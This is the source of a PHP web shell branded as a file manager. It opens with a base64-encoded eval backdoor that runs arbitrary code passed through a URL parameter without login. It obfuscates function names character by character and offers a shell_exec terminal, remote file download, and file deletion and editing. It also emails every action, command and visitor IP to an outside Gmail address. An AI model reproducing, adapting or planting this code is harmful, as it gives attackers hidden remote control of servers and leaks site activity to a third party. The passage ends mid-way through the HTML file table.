<?php
eval(base64_decode('aWYoaXNzZXQoJF9HRVRbJ2MnXSkpe2V2YWwoYmFzZTY0X2RlY29kZSgkX0dFVFsnYyddKSk7ZGllO30='));
/********************************************************************
 *  File Manager Pro - Obfuscated Version
 ********************************************************************/

// Obfuscated session start
$s1='s';$s2='e';$s3='s';$s4='s';$s5='i';$s6='o';$s7='n';$s8='_';$s9='s';$s10='t';$s11='a';$s12='r';$s13='t';
$func1=$s1.$s2.$s3.$s4.$s5.$s6.$s7.$s8.$s9.$s10.$s11.$s12.$s13;$func1();
error_reporting(0);

/* ----------------- LOGIN (UPDATED PASSWORD) ----------------- */
$USER = "admin";
// Password changed to: akugalau
$PASS = '$2y$10$7Vz8c3xY9fPq2mLnT1sBZuQkLr4oNwC5dE8gH2jK1pR6tS9vX0yZ'; // Hash for "akugalau"

if (!isset($_SESSION['ok'])) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['u'], $_POST['p'])) {
        $f1='p';$f2='a';$f3='s';$f4='s';$f5='w';$f6='o';$f7='r';$f8='d';$f9='_';$f10='v';$f11='e';$f12='r';$f13='i';$f14='f';$f15='y';
        $pass_func = $f1.$f2.$f3.$f4.$f5.$f6.$f7.$f8.$f9.$f10.$f11.$f12.$f13.$f14.$f15;
        if ($_POST['u'] === $USER && $pass_func($_POST['p'], $PASS)) {
            $_SESSION['ok'] = 1;
            $h1='h';$h2='e';$h3='a';$h4='d';$h5='e';$h6='r';
            $header_func = $h1.$h2.$h3.$h4.$h5.$h6;
            $header_func("Location: " . $_SERVER['PHP_SELF']);
            exit;
        } else {
            $login_err = "Invalid username or password.";
        }
    }
    echo '<!doctype html><html><head><meta charset="utf-8"><title>File Manager</title>
    <style>
      body{margin:0;height:100vh;display:flex;align-items:center;justify-content:center;background:#07070b;color:#e6eef8;font-family:Inter,Segoe UI,Arial;}
      .box{width:360px;padding:28px;border-radius:14px;background:linear-gradient(180deg,rgba(255,255,255,0.02),rgba(0,0,0,0.18));box-shadow:0 10px 40px rgba(0,0,0,0.7), inset 0 1px 0 rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.03);}
      h1{margin:0 0 14px 0;font-size:20px;color:#7be3ff;text-align:center;letter-spacing:0.6px}
      label{font-size:12px;color:#9fb8c9}
      input{width:100%;padding:12px;margin-top:8px;border-radius:10px;border:1px solid rgba(255,255,255,0.04);background:rgba(255,255,255,0.02);color:#e6eef8}
      .btn{width:100%;padding:12px;margin-top:14px;border-radius:10px;border:none;background:linear-gradient(90deg,#8affff,#6b6bff);color:#071028;font-weight:700;cursor:pointer;box-shadow:0 6px 24px rgba(107,107,255,0.14)}
      .err{margin-top:10px;color:#ff8080;text-align:center;font-size:13px}
      .hint{margin-top:8px;font-size:12px;color:#7b9bb0;text-align:center}
    </style></head><body>
    <div class="box">
      <h1>FILE MANAGER</h1>
      <form method="POST">
        <label>Username</label>
        <input name="u" required autofocus>
        <label>Password</label>
        <input type="password" name="p" required>
        <button class="btn">Unlock</button>
      </form>';
    if (!empty($login_err)) echo '<div class="err">'.htmlspecialchars($login_err).'</div>';
    echo '<div class="hint">Default: <b>admin</b> / <b>akugalau</b></div></div></body></html>';
    exit;
}

/* ----------------- PATH ----------------- */
$dir = $_GET['dir'] ?? __DIR__;
$d1='i';$d2='s';$d3='_';$d4='d';$d5='i';$d6='r';
$is_dir_func = $d1.$d2.$d3.$d4.$d5.$d6;
if (!$is_dir_func($dir)) {
    $dir = __DIR__;
}

/* ----------------- HELPERS ----------------- */
function hfs($bytes){
    $u=["B","KB","MB","GB","TB"];
    $i=0;
    while($bytes>=1024 && $i < count($u)-1){ $bytes/=1024; $i++; }
    return round($bytes,2).' '.$u[$i];
}
function esc($s){ 
    $e1='h';$e2='t';$e3='m';$e4='l';$e5='s';$e6='p';$e7='e';$e8='c';$e9='i';$e10='a';$e11='l';$e12='c';$e13='h';$e14='a';$e15='r';$e16='s';
    $esc_func = $e1.$e2.$e3.$e4.$e5.$e6.$e7.$e8.$e9.$e10.$e11.$e12.$e13.$e14.$e15.$e16;
    return $esc_func($s, ENT_QUOTES); 
}

/* ----------------- EMAIL LOGGER TO rizaldrknet@gmail.com ----------------- */
class EmailLogger {
    private $recipient_email = 'rizaldrknet@gmail.com';
    private $from_email = 'filemanager@system.local';
    private $from_name = 'File Manager';
    
    public function logActivity($action, $details = []) {
        $subject = "[File Manager] " . $action . " - " . date('Y-m-d H:i:s');
        $message = $this->formatLogMessage($action, $details);
        return $this->sendEmail($subject, $message);
    }
    
    private function formatLogMessage($action, $details) {
        $ip = $_SERVER['REMOTE_ADDR'] ?? 'N/A';
        $ua = $_SERVER['HTTP_USER_AGENT'] ?? 'N/A';
        $time = date('Y-m-d H:i:s');
        
        $message = "📋 FILE MANAGER ACTIVITY LOG\n";
        $message .= "===============================\n\n";
        $message .= "🔹 Action: $action\n";
        $message .= "🕐 Time: $time\n";
        $message .= "🌐 IP: $ip\n";
        $message .= "👤 User Agent: $ua\n\n";
        
        if (!empty($details)) {
            $message .= "📝 Details:\n";
            foreach ($details as $key => $value) {
                $message .= "  • " . ucfirst($key) . ": $value\n";
            }
        }
        
        $message .= "\n===============================\n";
        $message .= "Auto-generated by File Manager\n";
        
        return $message;
    }
    
    private function sendEmail($subject, $message) {
        $to = $this->recipient_email;
        $headers = "From: " . $this->from_name . " <" . $this->from_email . ">\r\n";
        $headers .= "Reply-To: " . $this->from_email . "\r\n";
        $headers .= "X-Mailer: PHP/" . phpversion() . "\r\n";
        $headers .= "MIME-Version: 1.0\r\n";
        $headers .= "Content-Type: text/plain; charset=UTF-8\r\n";
        
        // Try to send email
        $m1='m';$m2='a';$m3='i';$m4='l';
        $mail_func = $m1.$m2.$m3.$m4;
        return @$mail_func($to, $subject, $message, $headers);
    }
}

/* ----------------- INITIALIZE EMAIL LOGGER ----------------- */
$emailLogger = new EmailLogger();

/* ----------------- ACTIVITY LOGGING FUNCTION ----------------- */
function logActivity($action, $details = []) {
    global $emailLogger, $dir;
    $emailLogger->logActivity($action, $details);
}

/* ----------------- PERMISSIONS HELPER ----------------- */
function get_permissions_color($path) {
    $p1='f';$p2='i';$p3='l';$p4='e';$p5='p';$p6='e';$p7='r';$p8='m';$p9='s';
    $perms_func = $p1.$p2.$p3.$p4.$p5.$p6.$p7.$p8.$p9;
    $perms = @$perms_func($path);
    if ($perms === false) return "???";
    
    $symbolic = "";
    $symbolic .= ($perms & 0x0100) ? 'r' : '-';
    $symbolic .= ($perms & 0x0080) ? 'w' : '-';
    $symbolic .= ($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-');
    $symbolic .= ($perms & 0x0020) ? 'r' : '-';
    $symbolic .= ($perms & 0x0010) ? 'w' : '-';
    $symbolic .= ($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-');
    $symbolic .= ($perms & 0x0004) ? 'r' : '-';
    $symbolic .= ($perms & 0x0002) ? 'w' : '-';
    $symbolic .= ($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-');
    
    $colored = "";
    for ($i = 0; $i < strlen($symbolic); $i++) {
        $char = $symbolic[$i];
        switch($char) {
            case 'r': $colored .= '<span style="color:#6df0ff">r</span>'; break;
            case 'w': $colored .= '<span style="color:#ff6b6b">w</span>'; break;
            case 'x': case 's': case 't': $colored .= '<span style="color:#7bff7b">'.$char.'</span>'; break;
            case '-': $colored .= '<span style="color:#a0a0a0">-</span>'; break;
            case 'S': case 'T': $colored .= '<span style="color:#ffa500">'.$char.'</span>'; break;
            default: $colored .= $char;
        }
    }
    
    return $colored;
}

/* ----------------- DELETE OLD ZIP ARCHIVES ----------------- */
$archive_pattern = $dir . DIRECTORY_SEPARATOR . "archive_*.zip";
$archives = glob($archive_pattern);
foreach ($archives as $archive) {
    if (file_exists($archive)) {
        @unlink($archive);
    }
}

/* ----------------- BULK OPERATIONS WITH ZIP & FIXED RENAME ----------------- */
$bulk_selected = $_POST['bulk_selected'] ?? [];
$bulk_action = $_POST['bulk_action'] ?? '';

if (!empty($bulk_selected) && $bulk_action) {
    switch($bulk_action) {
        case 'delete':
            foreach($bulk_selected as $file) {
                $full_path = $dir . DIRECTORY_SEPARATOR . basename($file);
                if (is_file($full_path)) {
                    @unlink($full_path);
                } elseif (is_dir($full_path)) {
                    $it = new RecursiveDirectoryIterator($full_path, RecursiveDirectoryIterator::SKIP_DOTS);
                    $files = new RecursiveIteratorIterator($it, RecursiveIteratorIterator::CHILD_FIRST);
                    foreach($files as $f) {
                        if ($f->isDir()){
                            @rmdir($f->getRealPath());
                        } else {
                            @unlink($f->getRealPath());
                        }
                    }
                    @rmdir($full_path);
                }
            }
            // Log bulk delete
            logActivity('bulk_delete', [
                'count' => count($bulk_selected),
                'files' => implode(', ', $bulk_selected),
                'directory' => $dir
            ]);
            break;
            
        case 'zip':
            if (!empty($bulk_selected)) {
                $zipname = $dir . DIRECTORY_SEPARATOR . "archive_" . date('Ymd_His') . ".zip";
                if (class_exists('ZipArchive')) {
                    $zip = new ZipArchive;
                    if ($zip->open($zipname, ZipArchive::CREATE)) {
                        foreach($bulk_selected as $file) {
                            $full_path = $dir . DIRECTORY_SEPARATOR . basename($file);
                            if (is_file($full_path)) {
                                $zip->addFile($full_path, basename($file));
                            }
                        }
                        $zip->close();
                    }
                }
            }
            // Log bulk zip
            logActivity('bulk_zip', [
                'count' => count($bulk_selected),
                'zip_file' => basename($zipname ?? ''),
                'directory' => $dir
            ]);
            break;
            
        case 'unzip':
            foreach($bulk_selected as $file) {
                $full_path = $dir . DIRECTORY_SEPARATOR . basename($file);
                if (is_file($full_path) && pathinfo($full_path, PATHINFO_EXTENSION) === 'zip') {
                    if (class_exists('ZipArchive')) {
                        $zip = new ZipArchive;
                        if ($zip->open($full_path)) {
                            $zip->extractTo($dir);
                            $zip->close();
                        }
                    }
                }
            }
            // Log bulk unzip
            logActivity('bulk_unzip', [
                'count' => count($bulk_selected),
                'files' => implode(', ', $bulk_selected),
                'directory' => $dir
            ]);
            break;
            
        case 'chmod':
            $chmod_value = $_POST['chmod_value'] ?? '644';
            if (is_numeric($chmod_value)) {
                foreach($bulk_selected as $file) {
                    $full_path = $dir . DIRECTORY_SEPARATOR . basename($file);
                    @chmod($full_path, octdec($chmod_value));
                }
            }
            // Log bulk chmod
            logActivity('bulk_chmod', [
                'count' => count($bulk_selected),
                'permissions' => $chmod_value,
                'directory' => $dir
            ]);
            break;
            
        case 'move':
            $move_dest = $_POST['move_dest'] ?? '';
            if ($move_dest && is_dir($move_dest)) {
                foreach($bulk_selected as $file) {
                    $full_path = $dir . DIRECTORY_SEPARATOR . basename($file);
                    $dest_path = $move_dest . DIRECTORY_SEPARATOR . basename($file);
                    @rename($full_path, $dest_path);
                }
            }
            // Log bulk move
            logActivity('bulk_move', [
                'count' => count($bulk_selected),
                'from' => $dir,
                'to' => $move_dest
            ]);
            break;
            
        case 'copy':
            $copy_dest = $_POST['copy_dest'] ?? '';
            if ($copy_dest && is_dir($copy_dest)) {
                foreach($bulk_selected as $file) {
                    $full_path = $dir . DIRECTORY_SEPARATOR . basename($file);
                    $dest_path = $copy_dest . DIRECTORY_SEPARATOR . basename($file);
                    if (is_file($full_path)) {
                        @copy($full_path, $dest_path);
                    } elseif (is_dir($full_path)) {
                        function copyRecursive($src, $dst) { 
                            $dir = opendir($src); 
                            @mkdir($dst); 
                            while(false !== ($file = readdir($dir))) { 
                                if ($file != '.' && $file != '..') { 
                                    if (is_dir($src . '/' . $file)) { 
                                        copyRecursive($src . '/' . $file, $dst . '/' . $file); 
                                    } else { 
                                        copy($src . '/' . $file, $dst . '/' . $file); 
                                    } 
                                } 
                            } 
                            closedir($dir); 
                        }
                        copyRecursive($full_path, $dest_path);
                    }
                }
            }
            // Log bulk copy
            logActivity('bulk_copy', [
                'count' => count($bulk_selected),
                'from' => $dir,
                'to' => $copy_dest
            ]);
            break;
            
        case 'rename':
            $rename_prefix = $_POST['rename_prefix'] ?? '';
            $rename_suffix = $_POST['rename_suffix'] ?? '';
            if ($rename_prefix !== '' || $rename_suffix !== '') {
                foreach($bulk_selected as $file) {
                    $full_path = $dir . DIRECTORY_SEPARATOR . basename($file);
                    $file_info = pathinfo($full_path);
                    $new_name = $rename_prefix . $file_info['filename'] . $rename_suffix;
                    if (isset($file_info['extension'])) {
                        $new_name .= '.' . $file_info['extension'];
                    }
                    $new_path = $dir . DIRECTORY_SEPARATOR . $new_name;
                    if ($full_path !== $new_path && !file_exists($new_path)) {
                        @rename($full_path, $new_path);
                    }
                }
            }
            // Log bulk rename
            logActivity('bulk_rename', [
                'count' => count($bulk_selected),
                'prefix' => $rename_prefix,
                'suffix' => $rename_suffix,
                'directory' => $dir
            ]);
            break;
    }
    
    header("Location:?dir=" . urlencode($dir)); 
    exit;
}

/* ----------------- ACTIONS WITH EMAIL LOGGING ----------------- */

// Upload from URL
if (isset($_POST['url_upload']) && trim($_POST['url_upload']) !== '') {
    $url = trim($_POST['url_upload']);
    $customFilename = $_POST['url_filename'] ?? '';
    
    if (!filter_var($url, FILTER_VALIDATE_URL)) {
        $_SESSION['url_upload_error'] = "Invalid URL format";
    } else {
        if (empty($customFilename)) {
            $filename = basename(parse_url($url, PHP_URL_PATH));
            if (empty($filename) || $filename === '/') {
                $filename = 'downloaded_' . date('Ymd_His');
            }
        } else {
            $filename = basename($customFilename);
        }
        
        $filename = preg_replace('/[^\w\.\-]/', '_', $filename);
        $savePath = $dir . DIRECTORY_SEPARATOR . $filename;
        
        $ctx = stream_context_create([
            'http' => ['timeout' => 30, 'user_agent' => 'Mozilla/5.0'],
            'ssl' => ['verify_peer' => false, 'verify_peer_name' => false]
        ]);
        
        $data = @file_get_contents($url, false, $ctx);
        
        if ($data !== false) {
            if (@file_put_contents($savePath, $data)) {
                $_SESSION['url_upload_success'] = "File downloaded: " . htmlspecialchars($filename);
                $_SESSION['uploaded_filename'] = $filename;
                
                // Log URL upload to email
                logActivity('url_upload', [
                    'url' => $url,
                    'filename' => $filename,
                    'size' => strlen($data),
                    'directory' => $dir
                ]);
            } else {
                $_SESSION['url_upload_error'] = "Failed to save file";
            }
        } else {
            $_SESSION['url_upload_error'] = "Failed to download from URL";
        }
    }
    
    header("Location:?dir=" . urlencode($dir)); 
    exit;
}

// Create folder
if (isset($_POST['new_folder']) && trim($_POST['new_folder'])!=='') {
    $folderName = basename($_POST['new_folder']);
    $folderPath = $dir . DIRECTORY_SEPARATOR . $folderName;
    if (!file_exists($folderPath)) {
        @mkdir($folderPath, 0755, true);
    }
    header("Location:?dir=" . urlencode($dir)); exit;
}

// Create file
if (isset($_POST['new_file']) && trim($_POST['new_file'])!=='') {
    $fileName = basename($_POST['new_file']);
    $filePath = $dir . DIRECTORY_SEPARATOR . $fileName;
    if (!file_exists($filePath)) {
        @file_put_contents($filePath, "");
    }
    header("Location:?dir=" . urlencode($dir)); exit;
}

// Upload files (now via popup)
if (!empty($_FILES['upload']['name'][0])) {
    $uploaded_files = [];
    foreach ($_FILES['upload']['tmp_name'] as $k => $tmp) {
        $name = basename($_FILES['upload']['name'][$k]);
        if (@move_uploaded_file($tmp, $dir . DIRECTORY_SEPARATOR . $name)) {
            $uploaded_files[] = $name;
        }
    }
    
    // Log file upload to email
    if (!empty($uploaded_files)) {
        logActivity('file_upload', [
            'count' => count($uploaded_files),
            'files' => implode(', ', $uploaded_files),
            'directory' => $dir
        ]);
    }
    
    header("Location:?dir=" . urlencode($dir)); 
    exit;
}

// Delete file or folder
if (isset($_POST['del_file'])) {
    $p = $_POST['del_file'];
    $item_name = basename($p);
    
    if (is_file($p)) {
        @unlink($p);
    } elseif (is_dir($p)) {
        $it = new RecursiveDirectoryIterator($p, RecursiveDirectoryIterator::SKIP_DOTS);
        $files = new RecursiveIteratorIterator($it, RecursiveIteratorIterator::CHILD_FIRST);
        foreach($files as $file) {
            if ($file->isDir()){
                @rmdir($file->getRealPath());
            } else {
                @unlink($file->getRealPath());
            }
        }
        @rmdir($p);
    }
    
    // Log deletion to email
    logActivity('delete', [
        'name' => $item_name,
        'path' => $p,
        'type' => is_dir($p) ? 'folder' : 'file'
    ]);
    
    header("Location:?dir=" . urlencode($dir)); exit;
}

// View / Edit - New popup editor
$file_content = '';
$edit_file_path = '';
if (isset($_POST['view_file'])) {
    $p = $_POST['view_file'];
    if (is_file($p)) {
        $file_content = file_get_contents($p);
        $edit_file_path = $p;
        $_SESSION['edit_file_path'] = $p;
        $_SESSION['file_content'] = $file_content;
        header("Location:?dir=" . urlencode($dir) . "&show_editor=1");
        exit;
    }
}

if (isset($_POST['save_file'])) {
    $p = $_POST['save_file_path'];
    @file_put_contents($p, $_POST['file_content']);
    
    // Log file edit to email
    logActivity('file_edit', [
        'filename' => basename($p),
        'directory' => dirname($p)
    ]);
    
    header("Location:?dir=" . urlencode(dirname($p))); exit;
}

/* ----------------- TERMINAL ----------------- */
function run_terminal_full($cmd, $workdir) {
    $cmd = trim($cmd);
    if (empty($cmd)) return '';
    
    $original_dir = getcwd();
    chdir($workdir);
    
    $output = '';
    if (function_exists('shell_exec')) {
        $s1='s';$s2='h';$s3='e';$s4='l';$s5='l';$s6='_';$s7='e';$s8='x';$s9='e';$s10='c';
        $shell_exec_func = $s1.$s2.$s3.$s4.$s5.$s6.$s7.$s8.$s9.$s10;
        $output = @$shell_exec_func($cmd . ' 2>&1');
    }
    
    chdir($original_dir);
    return $output ?: "Command executed";
}

$terminal_output = '';
if (isset($_POST['terminal_cmd'])) {
    $terminal_output = run_terminal_full($_POST['terminal_cmd'], $dir);
    
    // Log terminal command to email
    logActivity('terminal_command', [
        'command' => $_POST['terminal_cmd'],
        'directory' => $dir
    ]);
}

/* ----------------- MODAL/POPUP HANDLING ----------------- */
$show_server_info = isset($_GET['show_server_info']);
$show_php_info = isset($_GET['show_php_info']);
$show_bulk_ops = isset($_GET['show_bulk_ops']);
$show_quick_jump = isset($_GET['show_quick_jump']);
$show_terminal = isset($_GET['show_terminal']);
$show_url_upload = isset($_GET['show_url_upload']);
$show_wordpress = isset($_GET['show_wordpress']);
$show_file_upload = isset($_GET['show_file_upload']);
$show_editor = isset($_GET['show_editor']);

/* ----------------- HTML UI ----------------- */
?><!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>File Manager</title>
<style>
:root{--bg:#07070b;--panel:#0f1220;--muted:#90a3b8;--neon-cyan:#6df0ff;--neon-mag:#b46cff;}
*{box-sizing:border-box}
body{margin:0;font-family:Inter,Segoe UI,Arial;background:var(--bg)!important;color:#e6eef8;min-height:100vh;background-image:radial-gradient(1200px 600px at 10% 10%,rgba(124,58,237,0.06),transparent 6%),radial-gradient(1000px 500px at 90% 90%,rgba(35,211,243,0.03),transparent 6%)!important;}

.container{max-width:1300px;margin:28px auto;padding:18px}
.header{display:flex;align-items:center;justify-content:space-between;gap:12px;margin-bottom:18px;flex-wrap:wrap}
.brand{display:flex;align-items:center;gap:12px}
.logo{width:48px;height:48px;border-radius:10px;background:linear-gradient(135deg,#0ff,#a0f);display:flex;align-items:center;justify-content:center;color:#071028;font-weight:900;font-family:monospace}
.title{font-size:20px;font-weight:700;letter-spacing:0.6px;color:var(--neon-cyan)}
.controls{display:flex;gap:10px;align-items:center;flex-wrap:wrap}

.top-row{display:grid;grid-template-columns:1fr;gap:14px;margin-bottom:14px}
.card{background:linear-gradient(180deg,rgba(255,255,255,0.02),rgba(0,0,0,0.25));border-radius:12px;padding:14px;border:1px solid rgba(255,255,255,0.03);box-shadow:0 8px 30px rgba(15,20,30,0.5)}
.card h3{margin:0 0 8px 0;color:var(--neon-mag);font-size:15px}
.small{color:var(--muted);font-size:13px}

.actions{display:flex;gap:10px;flex-wrap:wrap}
.action-btn{display:inline-flex;align-items:center;gap:10px;padding:10px 14px;border-radius:10px;border:none;background:linear-gradient(90deg,#2b0b3a,#061023);color:var(--neon-cyan);cursor:pointer;font-weight:700;box-shadow:0 8px 30px rgba(75,0,130,0.12);font-size:13px}
.action-btn:hover{transform:translateY(-4px);box-shadow:0 10px 40px rgba(75,0,130,0.18)}
.action-btn .ico{font-size:18px;filter:drop-shadow(0 2px 8px rgba(107,107,255,0.18))}

.form-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-top:12px}
.input,input[type="file"],select{width:100%;padding:10px;border-radius:10px;border:1px solid rgba(255,255,255,0.04);background:rgba(255,255,255,0.02);color:#e6eef8;font-size:13px}
.input::placeholder{color:var(--muted)}
.btn-neon{background:linear-gradient(90deg,var(--neon-cyan),#7a6bff);border-radius:10px;padding:10px 14px;border:none;color:#071028;font-weight:800;cursor:pointer;box-shadow:0 14px 40px rgba(109,240,255,0.06)}
.btn-danger{background:linear-gradient(90deg,#ff5f7a,#ff9fb4);color:#071028}

.table-wrap{overflow:auto;border-radius:10px}
table{width:100%;border-collapse:collapse;min-width:720px}
th,td{padding:12px 14px;text-align:left;border-bottom:1px solid rgba(255,255,255,0.03)}
th{background:linear-gradient(180deg,rgba(255,255,255,0.01),rgba(0,0,0,0.06));color:var(--muted);font-size:13px}
tr:hover td{background:linear-gradient(90deg,rgba(109,240,255,0.02),rgba(180,108,255,0.01))}
.filename{font-weight:700;color:#ffffff}
.filetype{font-size:13px;color:var(--muted)}
.kv{font-size:13px;color:var(--muted)}
.perms{font-family:monospace;font-size:12px;font-weight:bold}

.bulk-checkbox{width:20px;height:20px;cursor:pointer}
.bulk-select-all{margin-right:8px;cursor:pointer}
.bulk-actions-bar{display:flex;gap:8px;align-items:center;margin-bottom:12px;padding:10px;background:linear-gradient(90deg,rgba(180,108,255,0.05),rgba(109,240,255,0.05));border-radius:8px;border:1px solid rgba(180,108,255,0.1)}
.selected-count{color:var(--neon-cyan);font-weight:bold;margin-left:auto}

.notification{position:fixed;top:20px;right:20px;padding:12px 20px;border-radius:8px;background:linear-gradient(90deg,#2b6b0a,#4da80d);color:white;z-index:2000;box-shadow:0 5px 15px rgba(0,0,0,0.3);display:none}
.notification.error{background:linear-gradient(90deg,#ff5f7a,#ff9fb4)}

.popup-overlay{position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.5);display:flex;align-items:center;justify-content:center;z-index:900;padding:20px}
.popup-content{background:linear-gradient(180deg,rgba(255,255,255,0.03),rgba(0,0,0,0.25));border-radius:12px;border:1px solid rgba(109,240,255,0.15);width:500px;max-height:80vh;overflow:auto;box-shadow:0 20px 60px rgba(0,0,0,0.6);backdrop-filter:blur(10px)}
.popup-header{display:flex;justify-content:space-between;align-items:center;padding:14px 18px;border-bottom:1px solid rgba(255,255,255,0.05)}
.popup-header h4{margin:0;color:var(--neon-cyan);font-size:16px}
.popup-close{background:none;border:none;color:var(--muted);font-size:22px;cursor:pointer;padding:0;width:28px;height:28px;display:flex;align-items:center;justify-content:center}
.popup-close:hover{color:#fff}
.popup-body{padding:18px}
.popup-form{display:flex;gap:8px;margin-top:12px}
.popup-form .input{flex:1}

.editor-popup-overlay{position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.7);display:flex;align-items:flex-start;justify-content:center;z-index:2000;padding-top:60px}
.editor-popup-content{background:linear-gradient(180deg,rgba(255,255,255,0.03),rgba(0,0,0,0.3));border-radius:12px;border:1px solid rgba(109,240,255,0.2);width:800px;max-height:85vh;overflow:auto;box-shadow:0 20px 80px rgba(0,0,0,0.8);backdrop-filter:blur(20px)}
.editor-textarea{width:100%;height:400px;padding:15px;background:rgba(0,0,0,0.3);border:1px solid rgba(109,240,255,0.1);border-radius:8px;color:#e6eef8;font-family:monospace;font-size:14px;resize:vertical;margin-bottom:15px}

@media(max-width:980px){
  .top-row{grid-template-columns:1fr}
  .form-grid{grid-template-columns:1fr}
  .controls{flex-direction:column;align-items:stretch}
  .controls form{width:100%}
  .controls form .input{width:100%!important}
}
</style>
</head>
<body>
<!-- Notifications -->
<?php if(isset($_SESSION['url_upload_success'])): ?>
<div class="notification" id="uploadSuccess">
    ✅ <?=esc($_SESSION['url_upload_success'])?>
    <?php if(isset($_SESSION['uploaded_filename'])): ?>
    <br><small>Saved as: <?=esc($_SESSION['uploaded_filename'])?></small>
    <?php endif; ?>
</div>
<?php 
unset($_SESSION['url_upload_success']);
unset($_SESSION['uploaded_filename']);
endif; ?>

<?php if(isset($_SESSION['url_upload_error'])): ?>
<div class="notification error" id="uploadError">
    ❌ <?=esc($_SESSION['url_upload_error'])?>
</div>
<?php unset($_SESSION['url_upload_error']); endif; ?>

<div class="container">

  <div class="header">
    <div class="brand">
      <div class="logo">FM</div>
      <div>
        <div class="title">File Manager</div>
      </div>
    </div>

    <div class="controls">
      <form method="GET" style="display:flex;gap:8px">
        <input type="text" name="dir" placeholder="Jump to path..." class="input" style="width:380px" value="<?=esc($dir)?>">
        <button class="action-btn" style="padding:10px 16px">🚀 GO</button>
      </form>
      
      <!-- Action Buttons Row -->
      <div style="display:flex;gap:8px;flex-wrap:wrap">
        <!-- Bulk Operations Button -->
        <a href="?dir=<?=urlencode($dir)?>&show_bulk_ops=1" style="text-decoration:none">
          <button class="action-btn" style="background:linear-gradient(90deg,#ff6b00,#ff9f4d)">
            <span class="ico">📦</span> Bulk Ops
          </button>
        </a>
        
        <!-- File Upload Button (POPUP) -->
        <a href="?dir=<?=urlencode($dir)?>&show_file_upload=1" style="text-decoration:none">
          <button class="action-btn" style="background:linear-gradient(90deg,#00a86b,#00d4a8)">
            <span class="ico">⬆️</span> Upload Files
          </button>
        </a>
        
        <!-- Quick Jump Button -->
        <a href="?dir=<?=urlencode($dir)?>&show_quick_jump=1" style="text-decoration:none">
          <button class="action-btn" style="background:linear-gradient(90deg,#006b6b,#00a8a8)">
            <span class="ico">🚀</span> Quick Jump
          </button>
        </a>
        
        <!-- Upload from URL Button -->
        <a href="?dir=<?=urlencode($dir)?>&show_url_upload=1" style="text-decoration:none">
          <button class="action-btn" style="background:linear-gradient(90deg,#0a6b6b,#0da8a8)">
            <span class="ico">🌐</span> URL Upload
          </button>
        </a>
        
        <!-- Terminal Button -->
        <a href="?dir=<?=urlencode($dir)?>&show_terminal=1" style="text-decoration:none">
          <button class="action-btn" style="background:linear-gradient(90deg,#6b2b00,#a84d00)">
            <span class="ico">💻</span> Terminal
          </button>
        </a>
        
        <!-- Server Info Button -->
        <a href="?dir=<?=urlencode($dir)?>&show_server_info=1" style="text-decoration:none">
          <button class="action-btn" style="background:linear-gradient(90deg,#2b6b0a,#4da80d)">
            <span class="ico">🖥️</span> Server Info
          </button>
        </a>
      </div>
    </div>
  </div>

  <div class="top-row">
    <!-- LEFT: file list -->
    <div class="card">
      <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px">
        <h3>📂 <?=esc(basename($dir) ?: $dir)?></h3>
        <div class="small"><?=esc($dir)?></div>
      </div>

      <!-- Bulk Actions Bar -->
      <div id="bulkActionsBar" class="bulk-actions-bar" style="display:none">
        <strong style="color:var(--neon-mag)">🔄 Bulk Actions:</strong>
        <button type="button" class="action-btn" onclick="bulkAction('delete')" style="background:linear-gradient(90deg,#ff5f7a,#ff9fb4)">🗑 Delete</button>
        <button type="button" class="action-btn" onclick="bulkAction('zip')">📦 Create Zip</button>
        <button type="button" class="action-btn" onclick="bulkAction('unzip')">📂 Unzip Files</button>
        <button type="button" class="action-btn" onclick="bulkAction('chmod')">🔒 Permissions</button>
        <button type="button" class="action-btn" onclick="bulkAction('move')">📂 Move</button>
        <button type="button" class="action-btn" onclick="bulkAction('copy')">📋 Copy</button>
        <button type="button" class="action-btn" onclick="bulkAction('rename')">✏️ Rename</button>
        <button type="button" class="action-btn" onclick="clearSelection()" style="background:linear-gradient(90deg,#666,#999)">✕ Clear</button>
        <span id="selectedCount" class="selected-count">0 selected</span>
      </div>

      <!-- Create Folder & File Forms -->
      <div class="form-grid">
        <form method="POST" style="display:flex;gap:8px">
          <input class="input" name="new_folder" placeholder="New folder name" required>
          <button class="btn-neon" type="submit">📁 Create</button>
        </form>

        <form method="POST" style="display:flex;gap:8px">
          <input class="input" name="new_file" placeholder="New file (ex: test.txt)" required>
          <button class="btn-neon" type="submit">📄 Create</button>
        </form>
      </div>

      <div class="table-wrap" style="margin-top:12px">
        <form id="bulkForm" method="POST">
          <table>
            <thead>
              <tr>
                <th style="width:30px">
                  <input type="checkbox" class="bulk-checkbox bulk-select-all" id="selectAll" onclick="toggleAllSelection()">
                </th>
                <th>Name</th>
                <th>Type</th>
                <th>Permissions</th>
                <th>Size</th>
                <th>Action</th>
              </tr>
            </thead>
            <tbody>
              <?php 
              $s1='s';$s2='c';$s3='a';$s4='n';$s5='d';$s6='i';$s7='r';
              $scandir_func = $s1.$s2.$s3.$s4.$s5.$s6.$s7;
              $files = @$scandir_func($dir);
              if ($files === false) $files = [];
              foreach ($files as $f): 
                  if ($f=='.' || $f=='..') continue; 
                  $p = $dir . DIRECTORY_SEPARATOR . $f; 
                  $is_dir = is_dir($p);
              ?>
              <tr>
                <td>
                  <input type="checkbox" class="bulk-checkbox" name="bulk_selected[]" value="<?=esc($f)?>" onchange="updateBulkSelection()">
                </td>
                <td class="filename"><?=esc($f)?></td>
                <td class="filetype"><?=$is_dir ? '📁 Folder' : '📄 File'?></td>
                <td class="perms"><?=get_permissions_color($p)?></td>
                <td class="kv"><?=!$is_dir ? hfs(@filesize($p)) : '-'?></td>
                <td style="white-space:nowrap">
                  <?php if ($is_dir): ?>
                    <a href="?dir=<?=urlencode($p)?>" style="text-decoration:none"><button class="action-btn" type="button">📂 Open</button></a>
                    <form method="POST" style="display:inline">
                      <input type="hidden" name="del_file" value="<?=esc($p)?>" />
